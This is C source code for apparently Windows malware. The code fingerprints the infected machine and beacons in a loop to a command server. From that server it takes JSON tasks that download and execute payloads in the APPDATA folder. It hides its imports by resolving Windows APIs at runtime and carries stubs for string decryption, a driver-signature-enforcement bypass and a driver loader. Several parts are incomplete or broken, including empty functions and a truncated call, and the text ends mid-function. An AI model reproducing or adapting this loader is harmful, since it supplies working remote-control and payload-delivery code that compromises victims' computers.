#pragma warning(disable:4201)
#pragma warning(disable:4055)
#include <Windows.h>
#include <WinInet.h>
#include <wincrypt.h>
#include "json.h"
#include "header.h"
#include "strings.h"
extern DWORD dwlpParam;
extern FORCEINLINE PVOID ZeroBuffer(_Out_writes_bytes_all_(Size) PVOID Pointer, _In_ SIZE_T Size);

HW_PROFILE_INFO hwProfileInfo;
PCHAR PostData = NULL;
SIZE_T dwLen = 0;
HANDLE hStopEvent = NULL;
SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hServiceStatus = NULL;
LPWSTR GetId()
{
	
	if (_GetCurrentHwProfileW(&hwProfileInfo) != 0) {
		return hwProfileInfo.szHwProfileGuid;
	}
	return NULL;
}
WCHAR Version[6];
LPWSTR GetOS() {
	RTL_OSVERSIONINFOW rtosv;
	
	ZeroBuffer(&rtosv, sizeof(RTL_OSVERSIONINFOW));
	RtlGetVersion(&rtosv);
	_wsprintfW(Version, os_str, rtosv.dwMajorVersion, rtosv.dwMinorVersion);
	return Version;
}
BOOL Wow64() {
	ULONG_PTR Wow64;
	NTSTATUS Status;
	Status = NtQueryInformationProcess(NtCurrentProcess(), 26, &Wow64, sizeof(Wow64), NULL);
	if (Wow64 != 0) {
		return TRUE;
	}
	return FALSE;
}

BOOL DropFile(PWSTR File, PVOID Buffer, ULONG uLength) {
	HANDLE hFile = NULL;
	OBJECT_ATTRIBUTES objattr;
	ZeroBuffer(&objattr, sizeof(OBJECT_ATTRIBUTES));
	MY_UNICODE_STRING FilePath;

	RtlDosPathNameToNtPathName(File, &FilePath, NULL, NULL);
	IO_STATUS_BLOCK isb;
	ZeroBuffer(&isb, sizeof(IO_STATUS_BLOCK));
	InitializeObjectAttributes(&objattr, &FilePath, 0, NULL, NULL);

	NTSTATUS rv = NtCreateFile(&hFile, FILE_APPEND_DATA | FILE_WRITE_ACCESS | SYNCHRONIZE, &objattr, &isb, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	rv = NtWriteFile(hFile, NULL, NULL, NULL, &isb, Buffer, uLength, NULL, NULL);
	NtClose(hFile);
	return TRUE;
}
LPWSTR GetSys() {
	SYSTEM_PROCESSOR_INFORMATION ProcInfo;
	ZeroBuffer(&ProcInfo, sizeof(SYSTEM_PROCESSOR_INFORMATION));
	NTSTATUS Status = NtQuerySystemInformation(0x01, &ProcInfo, sizeof(ProcInfo), 0);
	if (!NT_SUCCESS(Status)) return NULL;
	switch (ProcInfo.ProcessorArchitecture) {
		case PROCESSOR_ARCHITECTURE_INTEL:
		{
			return INTEL;
		}
		case PROCESSOR_ARCHITECTURE_AMD64:
		{
			return AMD64;
		}
		case PROCESSOR_ARCHITECTURE_IA64:
		{
			return IA64;
		}
		default:
			return UNKNOWN;
	}
}
LPWSTR GetEnviroment() {
	if (Wow64()) {
		return WOW64;
	}
	return X32;

}
BOOL Dropper(LPCWSTR lpszUrl, PWSTR pwFile) {
	BOOL rv = FALSE;
	BYTE *bBuf = NULL;
	DWORD dwSize = 0;
	HANDLE hHeap = getfile(lpszUrl, &bBuf, &dwSize);
	if (hHeap != NULL) {
		rv = DropFile(pwFile, bBuf, dwSize);
		_HeapFree(hHeap, 0, bBuf);
		_HeapDestroy(hHeap);
		return rv;
	}
	return rv;
}
BOOL QueryAdminStatus() {
	BOOL bAdminStatus = FALSE;
	SID_IDENTIFIER_AUTHORITY pIdentifierAuthority = SECURITY_NT_AUTHORITY;
	PSID pSID = NULL;
	if (_AllocateAndInitializeSid(&pIdentifierAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSID)) {
		if (_CheckTokenMembership(NULL, pSID, &bAdminStatus)) {
			if (bAdminStatus) {
				//
				return bAdminStatus;
			}
		}
		FreeSid(pSID);
	}
	return bAdminStatus;

}
BOOL DSEBypass() {


}
VOID SuccessPOST(CHAR *data, DWORD dwlen)
{
	HINTERNET hSession = _InternetOpenA(UserAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	HINTERNET hConnect = _InternetConnectA(hSession, Domain, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
	HINTERNET hRequest = _HttpOpenRequestA(hConnect, POST_str, Alive, NULL, NULL, NULL, 0, 1);

	_HttpSendRequestA(hRequest, hdrs_str, _strlen(hdrs_str), data, dwlen);

	_InternetCloseHandle(hSession);
	_InternetCloseHandle(hConnect);
	_InternetCloseHandle(hRequest);
}
DWORD WINAPI PostRoutine(LPVOID lpParam) {
	UNREFERENCED_PARAMETER(lpParam);
	LPWSTR HWID = GetId();
	LPWSTR Env = GetEnviroment();
	LPWSTR Sys = GetSys();
	LPWSTR OS = GetOS();
	dwLen = _wcslen(HWID) + _wcslen(Env) + _wcslen(Sys) + _wcslen(OS) + 30;
	PostData = _HeapAlloc(_GetProcessHeap(), 0, dwLen * sizeof(WCHAR));
	_wsprintfA(PostData, POST_Data, HWID, Env, Sys, OS);

	HINTERNET hSession = _InternetOpenA(UserAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	HINTERNET hConnect = _InternetConnectA(hSession, Domain, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
	HINTERNET hRequest = _HttpOpenRequestA(hConnect, POST_str, Alive, NULL, NULL, NULL, 0, 1);

	SIZE_T stPostData = _strlen(PostData);
	for (;;) {
	
		if (_HttpSendRequestA(hRequest, hdrs_str, _strlen(hdrs_str), PostData, stPostData))
		{
					CHAR Buffer[300];
					DWORD dwRead = 0;
					ZeroBuffer(&Buffer, sizeof(Buffer));
					while (_InternetReadFile(hRequest, Buffer, sizeof(Buffer), &dwRead) && dwRead)
					{
						dwRead = 0;
					}
					if (Buffer != 0) {

						const nx_json* json = nx_json_parse(Buffer, 0);


						if (json) {
								const nx_json* arr = nx_json_get(json, TASKS_STR);
								for (int i = 0; i < arr->length; i++) {
									const nx_json* item = nx_json_item(arr, i);
									for (int z = 0; z < item->length; z++) {
										int command = (nx_json_item(item, z)->int_value);
										z++;
										BOOL Status = FALSE;
										switch (command) {
										case DOWNLOAD_AND_EXECUTE: {

											BYTE *buffer = NULL;
											DWORD Size = 0;
											LPCSTR url_dl = nx_json_item(item, z)->text_value;
											if (_strlen(url_dl) > 0) {

												LPWSTR url = _HeapAlloc(_GetProcessHeap(), 0, (_strlen(url_dl) + 1) * sizeof(WCHAR));
												if (url != NULL) {
													_wsprintfW(url, DOWNLOAD_STR, url_dl);
													PWSTR path = _HeapAlloc(_GetProcessHeap(), 0, MAX_PATH);
													if (path != NULL) {
														ZeroBuffer(path, MAX_PATH);

						
														_ExpandEnvironmentStringsW(APPDATA_STR, path, MAX_PATH);

														WCHAR Random[8];
														ZeroBuffer(Random, 8);
														_RtlGenRandom(Random, 7);
														_wsprintfW(path, EXE_PATH_STR, path, Random);

														HANDLE hHeap = getfile(url, &buffer, &Size);

														if (hHeap != NULL) {
															EXECUTE(path, buffer, Size);
															_HeapFree(hHeap, 0, buffer);
															_HeapDestroy(hHeap);
														}
														_HeapFree(_GetProcessHeap(), 0, path);
													}
													_HeapFree(_GetProcessHeap(), 0, url);
												}
											}
											
											PCHAR Success = _HeapAlloc(_GetProcessHeap(), 0, stPostData + 15);
											z++;
											if (Success != NULL) {
												Status = (Size > 0) ? TRUE : FALSE;
												_wsprintfA(Success, SUCCESS, PostData, Status, nx_json_item(item, z)->int_value);
												SuccessPOST(Success, _strlen(Success));
												_HeapFree(_GetProcessHeap(), 0, Success);
											}
											
											z++;
											break;
										}
										default:
											break;


										}
									}
								}
							
						}
					}
			}
		else {
			break;
		}
		_Sleep(1000);
	}
	_HeapFree(_GetProcessHeap(), 0, PostData);
	_InternetCloseHandle(hRequest);
	_InternetCloseHandle(hConnect);
	_InternetCloseHandle(hSession);
	return 0;

}


/*

BOOL DecryptANSIString(LPCSTR key, LPSTR StringName, SIZE_T stStringName) {
	// in progress
}
BOOL DecryptUnicodeString(LPCSTR key, LPWSTR StringName, SIZE_T stStringName){
// in progress
}
BOOL DecryptStrings(LPCSTR key){
	

	
	DecryptUnicodeString(key, MY_DRIVER, sizeof(MY_DRIVER));
	DecryptUnicodeString(key, os_str, sizeof(os_str));
	DecryptUnicodeString(key, INTEL, sizeof(INTEL));
	DecryptUnicodeString(key, AMD64, sizeof(AMD64));
	DecryptUnicodeString(key, IA64, sizeof(IA64));
	DecryptUnicodeString(key, UNKNOWN, sizeof(UNKNOWN));
	DecryptUnicodeString(key, WOW64, sizeof(WOW64));
	DecryptUnicodeString(key, X32, sizeof(X32));
	DecryptUnicodeString(key, dll_path_str, sizeof(dll_path_str));
	DecryptUnicodeString(key, DOWNLOAD_STR, sizeof(DOWNLOAD_STR));
	DecryptUnicodeString(key, APPDATA_STR, sizeof(APPDATA_STR));
	DecryptUnicodeString(key, EXE_PATH_STR, sizeof(EXE_PATH_STR));
	DecryptUnicodeString(key, NTDLL, sizeof(NTDLL));
	DecryptUnicodeString(key, ADVAPI32_DLL, sizeof(ADVAPI32_DLL));
	DecryptUnicodeString(key, KERNEL32_DLL, sizeof(KERNEL32_DLL));
	DecryptUnicodeString(key, USER32_DLL, sizeof(USER32_DLL));
	DecryptUnicodeString(key, HEADERS, sizeof(HEADERS));
	DecryptUnicodeString(key, WININET_DLL, sizeof(WININET_DLL));
	DecryptUnicodeString(key, SERVICE_NAME, sizeof(SERVICE_NAME));
	DecryptUnicodeString(key, SERVICE_DISPLAY, sizeof(SERVICE_DISPLAY));
	DecryptUnicodeString(key, DSE, sizeof(DSE));
	DecryptUnicodeString(key, POLICY, sizeof(POLICY));
	DecryptUnicodeString(key, GET_DRIVER, sizeof(GET_DRIVER));
	
	
	
	DecryptANSIString(key, Domain, sizeof(Domain));
	DecryptANSIString(key, Alive, sizeof(Alive));
	DecryptANSIString(key, hdrs_str, sizeof(hdrs_str));
	DecryptANSIString(key, http_post_str, sizeof(http_post_str));
	DecryptANSIString(key, POST_str, sizeof(POST_str));
	DecryptANSIString(key, POST_Data, sizeof(POST_Data));
	DecryptANSIString(key, TASKS_STR, sizeof(TASKS_STR));
	DecryptANSIString(key, SUCCESS, sizeof(SUCCESS));
	DecryptANSIString(key, LDRLOADDLL, sizeof(LDRLOADDLL));
	DecryptANSIString(key, LDRUNLOADDLL, sizeof(LDRUNLOADDLL));
	DecryptANSIString(key, RTLINITANSISTRING, sizeof(RTLINITANSISTRING));
	DecryptANSIString(key, RTLINITUNICODESTRING, sizeof(RTLINITUNICODESTRING));
	DecryptANSIString(key, LDRGETPROCEDUREADDRESS, sizeof(LDRGETPROCEDUREADDRESS));
	DecryptANSIString(key, LDRGETDLLHANDLE, sizeof(LDRGETDLLHANDLE));
	DecryptANSIString(key, RTLGETVERSION, sizeof(RTLGETVERSION));
	DecryptANSIString(key, NTQUERYSYSTEMINFORMATION, sizeof(NTQUERYSYSTEMINFORMATION));
	DecryptANSIString(key, NTQUERYINFORMATIONPROCESS, sizeof(NTQUERYINFORMATIONPROCESS));
	DecryptANSIString(key, NTCREATEFILE, sizeof(NTCREATEFILE));
	DecryptANSIString(key, NTWRITEFILE, sizeof(NTWRITEFILE));
	DecryptANSIString(key, NTCLOSE, sizeof(NTCLOSE));
	DecryptANSIString(key, NTCREATETHREADEX, sizeof(NTCREATETHREADEX));
	DecryptANSIString(key, RTLDOSPATHNAMETONTPATHNAME_U, sizeof(RTLDOSPATHNAMETONTPATHNAME_U));
	DecryptANSIString(key, GETMODULEFILENAMEW, sizeof(GETMODULEFILENAMEW));
	DecryptANSIString(key, HEAPALLOC, sizeof(HEAPALLOC));
	DecryptANSIString(key, HEAPFREE, sizeof(HEAPFREE));
	DecryptANSIString(key, HEAPDESTROY, sizeof(HEAPDESTROY));
	DecryptANSIString(key, GETPROCESSHEAP, sizeof(GETPROCESSHEAP));
	DecryptANSIString(key, RTLGENRANDOM, sizeof(RTLGENRANDOM));
	DecryptANSIString(key, WSPRINTFA, sizeof(WSPRINTFA));
	DecryptANSIString(key, WPSRINTFW, sizeof(WPSRINTFW));
	DecryptANSIString(key, INTERNETCLOSEHANDLE, sizeof(INTERNETCLOSEHANDLE));
	DecryptANSIString(key, INTERNETCONNECTA, sizeof(INTERNETCONNECTA));
	DecryptANSIString(key, HTTPOPENREQUESTA, sizeof(HTTPOPENREQUESTA));
	DecryptANSIString(key, INTERNETREADFILE, sizeof(INTERNETREADFILE));
	DecryptANSIString(key, INTERNETOPENURLW, sizeof(INTERNETOPENURLW));
	DecryptANSIString(key, INTERNETOPENA, sizeof(INTERNETOPENA));
	DecryptANSIString(key, INTERNETOPENW, sizeof(INTERNETOPENW));
	DecryptANSIString(key, CREATEPROCESSW, sizeof(CREATEPROCESSW));
	DecryptANSIString(key, GETFILEATTRIBUTES, sizeof(GETFILEATTRIBUTES));
	DecryptANSIString(key, EXPANDENVIROMENTSTRINGS, sizeof(EXPANDENVIROMENTSTRINGS));
	DecryptANSIString(key, HTTPSENDREQUESTA, sizeof(HTTPSENDREQUESTA));
	DecryptANSIString(key, HEAPREALLOC, sizeof(HEAPREALLOC));
	DecryptANSIString(key, HEAPCREATE, sizeof(HEAPCREATE));
	DecryptANSIString(key, GETLASTERROR, sizeof(GETLASTERROR));
	DecryptANSIString(key, GETCURRENTHWPROFILEW, sizeof(GETCURRENTHWPROFILEW));
	DecryptANSIString(key, SLEEP, sizeof(SLEEP));
	DecryptANSIString(key, REGCREATEKEYW, sizeof(REGCREATEKEYW));
	DecryptANSIString(key, REGCLOSE, sizeof(REGCLOSE));
	DecryptANSIString(key, REGSETVALUEEXW, sizeof(REGSETVALUEEXW));
	DecryptANSIString(key, OPENSCMANAGERW, sizeof(OPENSCMANAGERW));
	DecryptANSIString(key, OPENSERVICEW, sizeof(OPENSERVICEW));
	DecryptANSIString(key, QUERYSERVICESTATUS, sizeof(QUERYSERVICESTATUS));
	DecryptANSIString(key, GETCURRENTDIRECTORYW, sizeof(GETCURRENTDIRECTORYW));
	DecryptANSIString(key, CREATESERVICEW, sizeof(CREATESERVICEW));
	DecryptANSIString(key, CLOSESERVICEHANDLE, sizeof(CLOSESERVICEHANDLE));

}
*/
BOOL ResolveImports() {




	MY_UNICODE_STRING psAdvapi32;
	MY_UNICODE_STRING psNTDLL;
	MY_UNICODE_STRING psKERNEL32;
	MY_UNICODE_STRING psUser32;
	MY_UNICODE_STRING psWininet;

	HANDLE hNTDLL = NULL;
	HANDLE hAdvapi32 = NULL;
	HANDLE hKernel32 = NULL;
	HANDLE hUser32 = NULL;
	HANDLE hWininet = NULL;

	MY_ANSI_STRING ANSIS_LdrUnloadDll;
	MY_ANSI_STRING ANSIS_RtlGetVersion;
	MY_ANSI_STRING ANSIS_NtQuerySystemInformation;
	MY_ANSI_STRING ANSIS_NtQueryInformationProcess;
	MY_ANSI_STRING ANSIS_NtCreateFile;
	MY_ANSI_STRING ANSIS_NtWriteFile;
	MY_ANSI_STRING ANSIS_NtClose;
	MY_ANSI_STRING ANSIS_NtCreateThreadEx;
	MY_ANSI_STRING ANSIS_RtlGenRandom;
	MY_ANSI_STRING ANSIS_GetModuleFileName;
	MY_ANSI_STRING  ANSIS_RtlDosPathNameToNtPathName;
	MY_ANSI_STRING ANSIS_HeapAlloc;
	MY_ANSI_STRING ANSIS_HeapFree;
	MY_ANSI_STRING ANSIS_GetProcessHeap;
	MY_ANSI_STRING ANSIS_HeapDestroy;
	MY_ANSI_STRING ANSIS_wsprintfA;
	MY_ANSI_STRING ANSIS_wsprintfW;
	MY_ANSI_STRING ANSIS_GetLastError;

	MY_ANSI_STRING ANSIS_InternetCloseHandle;
	MY_ANSI_STRING ANSIS_InternetConnectA;
	MY_ANSI_STRING ANSIS_HttpOpenRequestA;
	MY_ANSI_STRING ANSIS_InternetReadFile;
	MY_ANSI_STRING ANSIS_InternetOpenUrlW;
	MY_ANSI_STRING ANSIS_InternetOpenA;
	MY_ANSI_STRING ANSIS_InternetOpenW;
	MY_ANSI_STRING ANSIS_CreateProcessW;
	MY_ANSI_STRING ANSIS_GetFileAttributesW;
	MY_ANSI_STRING ANSIS_ExpandEnviromentStringsW;
	MY_ANSI_STRING ANSIS_HttpSendRequestA;
	MY_ANSI_STRING ANSIS_HeapReAlloc;
	MY_ANSI_STRING ANSIS_HeapCreate;
	MY_ANSI_STRING ANSIS_GetCurrentHwProfileW;
	MY_ANSI_STRING ANSIS_Sleep;
	MY_ANSI_STRING ANSIS_RegCreateKeyW;
	MY_ANSI_STRING ANSIS_RegClose;
	MY_ANSI_STRING ANSIS_RegSetValueExW;

	//MY_ANSI_STRING ANSIS_RtlGetCurrentDirectory_U;
	MY_ANSI_STRING ANSIS_OpenSCManagerW;
	MY_ANSI_STRING ANSIS_OpenServiceW;
	MY_ANSI_STRING ANSIS_QueryServiceStatus;
	MY_ANSI_STRING ANSIS_GetCurrentDirectoryW;
	MY_ANSI_STRING ANSIS_CreateServiceW;
	MY_ANSI_STRING ANSIS_CloseServiceHandle;
	MY_ANSI_STRING ANSIS_GetExitCodeProcess;
	MY_ANSI_STRING ANSIS_AllocateAndInitializeSid;
	PVOID ntdll = My_GetModuleBase(NTDLL);

	if (ntdll != NULL) {

		LdrLoadDll = (_LdrLoadDll)My_GetModuleProcedureAddress(ntdll, LDRLOADDLL);
		RtlInitAnsiString = (_RtlInitAnsiString)My_GetModuleProcedureAddress(ntdll, RTLINITANSISTRING);
		RtlInitUnicodeString = (_RtlInitUnicodeString)My_GetModuleProcedureAddress(ntdll, RTLINITUNICODESTRING);
		LdrGetProcedureAddress = (_LdrGetProcedureAddress)My_GetModuleProcedureAddress(ntdll, LDRGETPROCEDUREADDRESS);
		LdrGetDllHandle = (_LdrGetDllHandle)My_GetModuleProcedureAddress(ntdll, LDRGETDLLHANDLE);

		if ((LdrLoadDll != NULL) && (RtlInitAnsiString != NULL) && (RtlInitUnicodeString != NULL) && (LdrGetProcedureAddress != NULL) && (LdrGetDllHandle != NULL)) {
			RtlInitUnicodeString(&psAdvapi32, ADVAPI32_DLL);
			RtlInitUnicodeString(&psNTDLL, NTDLL);
			RtlInitUnicodeString(&psKERNEL32, KERNEL32_DLL);
			RtlInitUnicodeString(&psUser32, USER32_DLL);
			RtlInitUnicodeString(&psWininet, WININET_DLL);

			LdrLoadDll(NULL, 0, &psAdvapi32, &hAdvapi32);
			LdrLoadDll(NULL, 0, &psNTDLL, &hNTDLL);
			LdrLoadDll(NULL, 0, &psKERNEL32, &hKernel32);
			LdrLoadDll(NULL, 0, &psUser32, &hUser32);
			LdrLoadDll(NULL, 0, &psWininet, &hWininet);

			LdrGetDllHandle(NULL, NULL, &psAdvapi32, &hAdvapi32);
			LdrGetDllHandle(NULL, NULL, &psNTDLL, &hNTDLL);
			LdrGetDllHandle(NULL, NULL, &psKERNEL32, &hKernel32);
			LdrGetDllHandle(NULL, NULL, &psUser32, &hUser32);
			LdrGetDllHandle(NULL, NULL, &psWininet, &hWininet);

			if ((hAdvapi32 != NULL) && (hNTDLL != NULL) && (hKernel32 != NULL) && (hUser32 != NULL) && (hWininet != NULL)) {



				RtlInitAnsiString(&ANSIS_LdrUnloadDll, LDRUNLOADDLL);
				RtlInitAnsiString(&ANSIS_RtlGetVersion, RTLGETVERSION);
				RtlInitAnsiString(&ANSIS_NtQuerySystemInformation, NTQUERYSYSTEMINFORMATION);
				RtlInitAnsiString(&ANSIS_NtQueryInformationProcess, NTQUERYINFORMATIONPROCESS);
				RtlInitAnsiString(&ANSIS_NtCreateFile, NTCREATEFILE);
				RtlInitAnsiString(&ANSIS_NtWriteFile, NTWRITEFILE);
				RtlInitAnsiString(&ANSIS_NtClose, NTCLOSE);
				RtlInitAnsiString(&ANSIS_NtCreateThreadEx, NTCREATETHREADEX);
				RtlInitAnsiString(&ANSIS_RtlDosPathNameToNtPathName, RTLDOSPATHNAMETONTPATHNAME_U);
				RtlInitAnsiString(&ANSIS_GetModuleFileName, GETMODULEFILENAMEW);
				RtlInitAnsiString(&ANSIS_HeapAlloc, HEAPALLOC);
				RtlInitAnsiString(&ANSIS_HeapFree, HEAPFREE);
				RtlInitAnsiString(&ANSIS_HeapDestroy, HEAPDESTROY);
				RtlInitAnsiString(&ANSIS_GetProcessHeap, GETPROCESSHEAP);
				RtlInitAnsiString(&ANSIS_GetLastError, GETLASTERROR);
				RtlInitAnsiString(&ANSIS_RtlGenRandom, RTLGENRANDOM);
				RtlInitAnsiString(&ANSIS_wsprintfA, WSPRINTFA);
				RtlInitAnsiString(&ANSIS_wsprintfW, WPSRINTFW);
				RtlInitAnsiString(&ANSIS_Sleep, SLEEP);



				RtlInitAnsiString(&ANSIS_CloseServiceHandle, CLOSESERVICEHANDLE);
				RtlInitAnsiString(&ANSIS_CreateServiceW, CREATESERVICEW);
				RtlInitAnsiString(&ANSIS_GetCurrentDirectoryW, GETCURRENTDIRECTORYW);
				RtlInitAnsiString(&ANSIS_QueryServiceStatus, QUERYSERVICESTATUS);
				RtlInitAnsiString(&ANSIS_OpenSCManagerW, OPENSCMANAGERW);
				RtlInitAnsiString(&ANSIS_OpenServiceW, OPENSERVICEW);

				RtlInitAnsiString(&ANSIS_RegCreateKeyW, REGCREATEKEYW);
				RtlInitAnsiString(&ANSIS_RegSetValueExW, REGSETVALUEEXW);
				RtlInitAnsiString(&ANSIS_RegClose, REGCLOSE);

				RtlInitAnsiString(&ANSIS_InternetCloseHandle, INTERNETCLOSEHANDLE);
				RtlInitAnsiString(&ANSIS_InternetConnectA, INTERNETCONNECTA);
				RtlInitAnsiString(&ANSIS_HttpOpenRequestA, HTTPOPENREQUESTA);
				RtlInitAnsiString(&ANSIS_InternetReadFile, INTERNETREADFILE);
				RtlInitAnsiString(&ANSIS_InternetOpenUrlW, INTERNETOPENURLW);
				RtlInitAnsiString(&ANSIS_InternetOpenA, INTERNETOPENA);
				RtlInitAnsiString(&ANSIS_InternetOpenW, INTERNETOPENW);
				RtlInitAnsiString(&ANSIS_CreateProcessW, CREATEPROCESSW);
				RtlInitAnsiString(&ANSIS_GetFileAttributesW, GETFILEATTRIBUTES);
				RtlInitAnsiString(&ANSIS_ExpandEnviromentStringsW, EXPANDENVIROMENTSTRINGS);
				RtlInitAnsiString(&ANSIS_HttpSendRequestA, HTTPSENDREQUESTA);
				RtlInitAnsiString(&ANSIS_HeapReAlloc, HEAPREALLOC);
				RtlInitAnsiString(&ANSIS_HeapCreate, HEAPCREATE);
				RtlInitAnsiString(&ANSIS_GetCurrentHwProfileW, GETCURRENTHWPROFILEW);
				RtlInitAnsiString(&ANSIS_GetExitCodeProcess, GETEXITCODEPROCESS);
					LdrGetProcedureAddress(hNTDLL, &ANSIS_LdrUnloadDll, 0, (PVOID*)&LdrUnloadDll);
					LdrGetProcedureAddress(hNTDLL, &ANSIS_RtlGetVersion, 0, (PVOID*)&RtlGetVersion);
					LdrGetProcedureAddress(hNTDLL, &ANSIS_NtQuerySystemInformation, 0, (PVOID*)&NtQuerySystemInformation);
					LdrGetProcedureAddress(hNTDLL, &ANSIS_NtQueryInformationProcess, 0, (PVOID*)&NtQueryInformationProcess);
					LdrGetProcedureAddress(hNTDLL, &ANSIS_NtCreateFile, 0, (PVOID*)&NtCreateFile);
					LdrGetProcedureAddress(hNTDLL, &ANSIS_NtWriteFile, 0, (PVOID*)&NtWriteFile);
					LdrGetProcedureAddress(hNTDLL, &ANSIS_NtClose, 0, (PVOID*)&NtClose);
					LdrGetProcedureAddress(hNTDLL, &ANSIS_NtCreateThreadEx, 0, (PVOID*)&NtCreateThreadEx);
					LdrGetProcedureAddress(hNTDLL, &ANSIS_RtlDosPathNameToNtPathName, 0, (PVOID*)&RtlDosPathNameToNtPathName);
					LdrGetProcedureAddress(hKernel32, &ANSIS_GetModuleFileName, 0, (PVOID*)&_GetModuleFileName);
					LdrGetProcedureAddress(hKernel32, &ANSIS_HeapAlloc, 0, (PVOID*)&_HeapAlloc);
					LdrGetProcedureAddress(hKernel32, &ANSIS_HeapFree, 0, (PVOID*)&_HeapFree);
					LdrGetProcedureAddress(hKernel32, &ANSIS_HeapDestroy, 0, (PVOID*)&_HeapDestroy);
					LdrGetProcedureAddress(hKernel32, &ANSIS_GetProcessHeap, 0, (PVOID*)&_GetProcessHeap);
					LdrGetProcedureAddress(hKernel32, &ANSIS_GetLastError, 0, (PVOID*)&_GetLastError);
					LdrGetProcedureAddress(hKernel32, &ANSIS_Sleep, 0, (PVOID*)&_Sleep);
					LdrGetProcedureAddress(hKernel32, &ANSIS_GetExitCodeProcess, 0, (PVOID*)&_GetExitCodeProcess);

					LdrGetProcedureAddress(h)
					LdrGetProcedureAddress(hAdvapi32, &ANSIS_RtlGenRandom, 0, (PVOID*)&_RtlGenRandom);
					LdrGetProcedureAddress(hAdvapi32, &ANSIS_GetCurrentHwProfileW, 0, (PVOID*)&_GetCurrentHwProfileW);
					LdrGetProcedureAddress(hUser32, &ANSIS_wsprintfA, 0, (PVOID*)&_wsprintfA);
					LdrGetProcedureAddress(hUser32, &ANSIS_wsprintfW, 0, (PVOID*)&_wsprintfW);
					LdrGetProcedureAddress(hWininet, &ANSIS_InternetCloseHandle, 0, (PVOID*)&_InternetCloseHandle);
					LdrGetProcedureAddress(hWininet, &ANSIS_InternetConnectA, 0, (PVOID*)&_InternetConnectA);
					LdrGetProcedureAddress(hWininet, &ANSIS_HttpOpenRequestA, 0, (PVOID*)&_HttpOpenRequestA);
					LdrGetProcedureAddress(hWininet, &ANSIS_InternetReadFile, 0, (PVOID*)&_InternetReadFile);
					LdrGetProcedureAddress(hWininet, &ANSIS_InternetOpenUrlW, 0, (PVOID*)&_InternetOpenUrlW);
					LdrGetProcedureAddress(hWininet, &ANSIS_InternetOpenA, 0, (PVOID*)&_InternetOpenA);
					LdrGetProcedureAddress(hWininet, &ANSIS_InternetOpenW, 0, (PVOID*)&_InternetOpenW);
					LdrGetProcedureAddress(hWininet, &ANSIS_HttpSendRequestA, 0, (PVOID*)&_HttpSendRequestA);
					LdrGetProcedureAddress(hKernel32, &ANSIS_CreateProcessW, 0, (PVOID*)&_CreateProcessW);
					LdrGetProcedureAddress(hKernel32, &ANSIS_GetFileAttributesW, 0, (PVOID*)&_GetFileAttributesW);
					LdrGetProcedureAddress(hKernel32, &ANSIS_ExpandEnviromentStringsW, 0, (PVOID*)&_ExpandEnvironmentStringsW);
					LdrGetProcedureAddress(hKernel32, &ANSIS_HeapCreate, 0, (PVOID*)&_HeapCreate);
					LdrGetProcedureAddress(hKernel32, &ANSIS_HeapReAlloc, 0, (PVOID*)&_HeapReAlloc);


					LdrGetProcedureAddress(hAdvapi32, &ANSIS_CloseServiceHandle, 0, (PVOID*)&_CloseServiceHandle);
					LdrGetProcedureAddress(hAdvapi32, &ANSIS_CreateServiceW, 0, (PVOID*)&_CreateServiceW);
					LdrGetProcedureAddress(hKernel32, &ANSIS_GetCurrentDirectoryW, 0, (PVOID*)&_GetCurrentDirectoryW);
					LdrGetProcedureAddress(hAdvapi32, &ANSIS_QueryServiceStatus, 0, (PVOID*)&_QueryServiceStatus);
					LdrGetProcedureAddress(hAdvapi32, &ANSIS_OpenSCManagerW, 0, (PVOID*)&_OpenSCManagerW);
					LdrGetProcedureAddress(hAdvapi32, &ANSIS_OpenServiceW, 0, (PVOID*)&_OpenServiceW);



					LdrGetProcedureAddress(hAdvapi32, &ANSIS_RegCreateKeyW, 0, (PVOID*)&_RegCreateKeyExW);
					LdrGetProcedureAddress(hAdvapi32, &ANSIS_RegSetValueExW, 0, (PVOID*)&_RegSetValueExW);
					LdrGetProcedureAddress(hAdvapi32, &ANSIS_RegClose, 0, (PVOID*)&_RegCloseKey);

				//	LdrGetProcedureAddress(hNTDLL, &ANSIS_RtlGetCurrentDirectory_U, 0, (PVOID)_RtlGetCurrentDirectory_U);

				if (
						(LdrUnloadDll != NULL) && (RtlGetVersion != NULL) && (NtQuerySystemInformation != NULL) && (NtQueryInformationProcess != NULL) &&
						 (NtCreateFile != NULL) && (NtWriteFile != NULL) && (NtClose != NULL) &&
						(NtCreateThreadEx != NULL) && (RtlDosPathNameToNtPathName != NULL) &&
						(_GetModuleFileName != NULL) && (_HeapAlloc != NULL) && (_HeapFree != NULL) && (_HeapDestroy != NULL) &&
						(_GetProcessHeap != NULL) && (_GetLastError != NULL) && (_Sleep != NULL) && (_RtlGenRandom != NULL) &&
						(_GetCurrentHwProfileW != NULL) && (_wsprintfA != NULL) && (_wsprintfW != NULL) && (_InternetCloseHandle != NULL) &&
						(_InternetConnectA != NULL) && (_HttpOpenRequestA != NULL) && (_InternetReadFile != NULL) && (_InternetOpenUrlW != NULL) &&
						(_InternetOpenA != NULL) && (_InternetOpenW != NULL) && (_HttpSendRequestA != NULL) && (_CreateProcessW != NULL) &&
						(_GetFileAttributesW != NULL) && (_ExpandEnvironmentStringsW != NULL) && (_HeapCreate != NULL) && (_HeapReAlloc != NULL)// &&
					&& (_GetCurrentDirectoryW != NULL)	//		(_CloseServiceHandle != NULL) && (_CreateServiceW != NULL)// && (_QueryServiceStatus != NULL) &&
					//	(_OpenSCManagerW != NULL) && (_OpenServiceW != NULL) 

						&& (_RegCreateKeyExW != NULL) && (_RegCloseKey != NULL) && (_RegSetValueExW != NULL)
						) {

					return TRUE;
				}
				else {
				}
			}
		}

	}

	

	return FALSE;
}
DWORD WINAPI StartDriver(LPVOID lpParam) {

	UNREFERENCED_PARAMETER(lpParam);
	HANDLE hDriver = INVALID_HANDLE_VALUE;
	OBJECT_ATTRIBUTES objattr;
